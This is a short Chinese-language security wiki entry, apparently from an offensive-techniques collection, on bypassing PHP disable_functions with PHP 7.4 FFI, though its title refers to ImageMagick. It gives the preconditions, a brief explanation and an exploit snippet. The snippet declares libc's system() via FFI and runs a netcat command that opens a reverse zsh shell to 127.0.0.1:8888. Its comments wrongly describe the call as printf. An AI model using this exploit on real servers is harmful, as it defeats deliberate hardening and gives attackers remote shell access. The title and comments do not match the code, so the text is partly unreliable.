## 利用 ImageMagick 漏洞绕过（二）

**1.利用条件**

php 7.4

ffi.enable=true

**2.基本原理**

FFI（Foreign Function Interface），即外部函数接口，允许从用户区调用C代码。
当PHP所有的命令执行函数被禁用后，通过PHP 7.4的新特性FFI可以实现用PHP代码调用C代码的方式，先声明C中的命令执行函数，然后再通过FFI变量调用该C函数即可Bypass disable_functions。

![](images/security_wiki/15904998297441.png)


**3.exp**

```php
<?php
// create FFI object, loading libc and exporting function printf()
$ffi = FFI::cdef(
   "int system(char *command);", // this is a regular C declaration
   "libc.so.6");
// call C's printf()
$a='nc -e /usr/bin/zsh 127.0.0.1 8888';
$ffi->system($a);
?>

```

